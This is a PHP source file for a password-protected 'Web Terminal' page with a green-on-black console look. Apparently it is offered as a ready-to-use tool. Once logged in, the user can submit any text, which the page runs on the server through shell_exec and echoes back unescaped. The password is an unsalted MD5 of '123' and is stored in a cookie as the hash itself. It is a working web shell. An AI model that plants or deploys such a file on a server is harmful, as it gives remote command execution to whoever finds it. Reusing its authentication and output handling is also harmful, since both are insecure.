<?php
// Password protection
$password = "202cb962ac59075b964b07152d234b70"; // MD5 hash of "123"

// Check if password cookie is set and matches
if (isset($_COOKIE['password']) && $_COOKIE['password'] === $password) {
    $authenticated = true;
} else {
    $authenticated = false;
}

// If form is submitted, check password and set cookie if correct
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["password"])) {
    $enteredPassword = md5($_POST["password"]);
    if ($enteredPassword === $password) {
        setcookie('password', $password, time() + (86400 * 30), "/"); // Set cookie for 30 days
        $authenticated = true;
    } else {
        $authenticated = false;
        $errorMessage = "Incorrect password!";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Terminal</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 0;
        }
        .container {
            padding: 20px;
        }
        .terminal {
            width: 50%;
            margin-left: 20px; /* Add some margin for separation */
        }
        .terminal h1 {
            margin-top: 0;
        }
        .terminal pre {
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .terminal input[type="text"] {
            margin-bottom: 10px; /* Add margin between input and output */
        }
        .login-form {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .login-form label, .login-form input, .login-form button {
            display: block;
            margin-bottom: 10px;
        }
        .login-form input[type="password"] {
            width: 150px; /* Set a fixed width */
            padding: 5px;
            border: 1px solid #0f0;
            background-color: #000;
            color: #0f0;
            outline: none;
        }
        .login-form button {
            padding: 5px 10px;
            background-color: #0f0;
            color: #000;
            border: none;
            cursor: pointer;
        }
        .error-message {
            color: red;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <?php if ($authenticated): ?>
            <div class="terminal">
                <h1>Welcome to Web Terminal</h1>
                <form id="command-form" method="post">
                    <label for="command">Enter Command:</label>
                    <input type="text" id="command" name="command" autocomplete="off">
                    <button type="submit">Execute</button>
                </form>
                <div id="output">
                    <?php
                    if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["command"])) {
                        $command = $_POST["command"];
                        // Execute command based on OS
                        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                            // Windows
                            $output = shell_exec("cmd /c " . $command);
                            // Format output for Windows commands like dir
                            $output = nl2br($output); // Convert new lines to <br> tags
                        } else {
                            // Unix/Linux/MacOS
                            $output = shell_exec($command);
                        }

                        // Display output
                        if ($output === null) {
                            echo "No output";
                        } else {
                            echo '<pre>' . $output . '</pre>'; // Wrap output in <pre> tags for better formatting
                        }
                    }
                    ?>
                </div>
            </div>
        <?php else: ?>
            <form class="login-form" method="post">
                <label for="password">Enter Password:</label>
                <input type="password" id="password" name="password" autocomplete="off">
                <?php if(isset($errorMessage)): ?>
                    <p class="error-message"><?php echo $errorMessage; ?></p>
                <?php endif; ?>
                <button type="submit">Login</button>
            </form>
        <?php endif; ?>
    </div>
</body>
</html>
